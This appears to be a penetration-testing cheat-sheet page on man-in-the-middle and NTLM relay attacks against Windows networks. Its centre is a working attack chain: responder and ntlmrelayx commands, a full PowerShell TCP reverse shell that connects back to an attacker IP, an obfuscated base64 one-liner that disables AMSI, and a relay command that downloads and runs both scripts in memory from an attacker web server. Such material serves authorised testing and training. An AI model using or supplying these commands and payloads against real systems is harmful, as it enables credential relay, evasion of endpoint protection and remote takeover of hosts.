# MitM & Relay



{% hint style="info" %}
#### For a full list of MitM techniques refer to [MitM & poisoning](broken-reference) section.
{% endhint %}

## <mark style="color:red;">RDP MitM</mark>

#### refer to[ this section](../../network-poisoning-mitm/rdp-downgrade.md) .

## <mark style="color:red;">MS08-068</mark>

{% embed url="https://www.rapid7.com/blog/post/2008/11/11/ms08-068-metasploit-and-smb-relay" %}

{% embed url="https://msrc-blog.microsoft.com/2008/11/11/ms08-068-smb-credential-reflection-defense" %}

### <mark style="color:orange;">Metasploit Module</mark>

```
use exploit/windows/smb/smb_relay 
# windows2000 / windows server2008
```

## <mark style="color:red;">NTLM Relay</mark>

```
responder -I eth0 #Â disable smb & http
ntlmrelayx.py -tf targets.txt
```

## <mark style="color:red;">NTLM Relay + Empire</mark>

{% embed url="https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html" %}

{% embed url="https://youtu.be/f9oMVoc2Umc" %}

## <mark style="color:red;">NTLM Relay + AMSI Bypass</mark>

{% hint style="info" %}
Combining NTLM relay with empire one-liners is not effective in a modern Active Directory Environment with latest windows security updates because AMSI has evolved and the payload is easily detected and blocked.
{% endhint %}

This technique will use the same principles of NTLM relay but with a simple trick to bypass AMSI and get a reverse shell, the AMSI  bypass script and reverse shell payload can be different but the one i am using here could bypass windows 10  pro update 1/20/2020 with windows defender and AMSI enabled.

#### <mark style="color:green;">find hosts with smb signing disabled:</mark>

```
crackmapexec smb 192.168.56.1/24 --gen-relay-list targets
```

#### <mark style="color:green;">simple powershell TCP reverse shell payload (catch with netcat or metasploit multi/handler):</mark>

{% code title="rev.ps1" %}
```
$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush();
}
$client.Close();
```
{% endcode %}

#### <mark style="color:green;">AMSI bypass payload (try using other payloads if this doesn't work):</mark>

{% code title="bypass.ps1" %}
```
[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
```
{% endcode %}

#### <mark style="color:green;">run a python http server to serve these files:</mark>

```
python3 -m http.server 9000
```

#### <mark style="color:green;">run responder and ntlmrelayx with a powershell command to load the scripts in memory and execute them in the same powershell session (otherwise the bypass wont work):</mark>

```
 responder -I vboxnet0 -dw
 
 impacket-ntlmrelayx  --delegate-access -smb2support -tf targets -c "powershell -ep bypass -c IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.56.1:9000/bypass.ps1');IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.56.1:9000/rev.ps1')"
```

now when responder gets new hashes, ntlmrelayx will relay them and if the login was successful, power powershell command will load bypass and reverse shell scripts in memory and execute both og them to bypass AMSI and we get a shell.
